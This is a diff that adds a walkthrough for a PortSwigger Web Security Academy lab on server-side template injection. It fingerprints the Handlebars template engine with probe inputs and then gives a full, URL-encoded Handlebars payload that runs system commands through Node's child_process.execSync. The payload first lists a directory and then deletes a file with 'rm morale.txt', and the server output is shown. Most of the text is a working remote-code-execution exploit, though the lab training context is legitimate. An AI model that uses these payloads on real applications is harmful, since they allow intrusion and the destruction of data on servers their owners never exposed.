@@ -1,0 +1,57 @@
+The payloads below are meant to solve the following labs:
+https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit
+
+Clicking on the first shop item revelas the following query parameter and value:
+?message=Unfortunately this product is out of stock
+
+The following four payloads are used to get an idea of what template engine is being used and how it responds to different data:
+
+Payload: {{
+Response: Error, Handlebars stack trace
+
+Payload: {{7*7}}
+Response: Error, Handlebars stack trace
+
+Payload: {{7}}
+Response: Nothing
+
+Payload: {{this}}
+Response: [object Object]
+
+Now that we know the template engine being used is Handlebars we can look online for an exploit, which will lead us to the following URL:
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md#handlebars---command-execution
+
+Reading through the section for Handlebars we'll find the following payload for executing system commands:
+
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+
+Making the payload a one liner and URL encoding the "#" characters leads to the following payload:
+
+Payload: {{%23with "s" as |string|}}{{%23with "e"}}{{%23with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{%23with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('ls -la');"}}{{this.pop}}{{%23each conslist}}{{%23with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+Response: e2[object Object]function Function() { [native code] }2[object Object]total 24 drwxr-xr-x 1 carlos carlos 45 Jul 7 19:33 . drwxr-xr-x 1 root root 20 Jul 3 01:11 .. -rw-rw-r-- 1 carlos carlos 132 Jul 7 19:33 .bash_history -rw-r--r-- 1 carlos carlos 220 Feb 25 2020 .bash_logout -rw-r--r-- 1 carlos carlos 3771 Feb 25 2020 .bashrc -rw-r--r-- 1 carlos carlos 807 Feb 25 2020 .profile -rw-rw-r-- 1 carlos carlos 6816 Jul 7 19:33 morale.txt
+
+After seeing that the morale.txt file is in the current directory we can modify the above payload and replace "ls -la" with "rm morale.txt" to delete the file that belongs to Carlos.
+
+Payload: {{%23with "s" as |string|}}{{%23with "e"}}{{%23with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{%23with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').execSync('rm morale.txt');"}}{{this.pop}}{{%23each conslist}}{{%23with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+Response: e2[object Object]function Function() { [native code] }2[object Object]
+
